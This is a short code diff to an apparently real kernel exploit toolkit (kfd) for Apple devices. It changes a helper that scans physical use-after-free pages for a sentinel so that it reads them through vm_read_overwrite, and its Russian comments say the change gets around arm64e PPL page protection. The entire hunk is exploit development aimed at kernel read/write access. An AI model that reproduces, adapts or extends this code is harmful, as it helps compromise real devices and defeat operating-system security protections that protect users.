@@ -143,7 +143,18 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
         u64 grabbed_puaf_pages = 0;
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
-            if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
+            // arm64e: PUAF страницы PPL-owned, прямой memcmp -> SIGSEGV
+            // Используем vm_read_overwrite чтобы обойти PPL pmap защиту
+            u8 tmp_sentinel[info_copy_sentinel_size];
+            vm_size_t out_size = 0;
+            kern_return_t kr = vm_read_overwrite(
+                mach_task_self(),
+                (vm_address_t)puaf_page_uaddr,
+                info_copy_sentinel_size,
+                (vm_address_t)tmp_sentinel,
+                &out_size);
+            if (kr != KERN_SUCCESS || out_size != info_copy_sentinel_size) continue;
+            if (!memcmp(info_copy_sentinel, tmp_sentinel, info_copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                     print_u64(grabbed_free_pages);
                     timer_end();
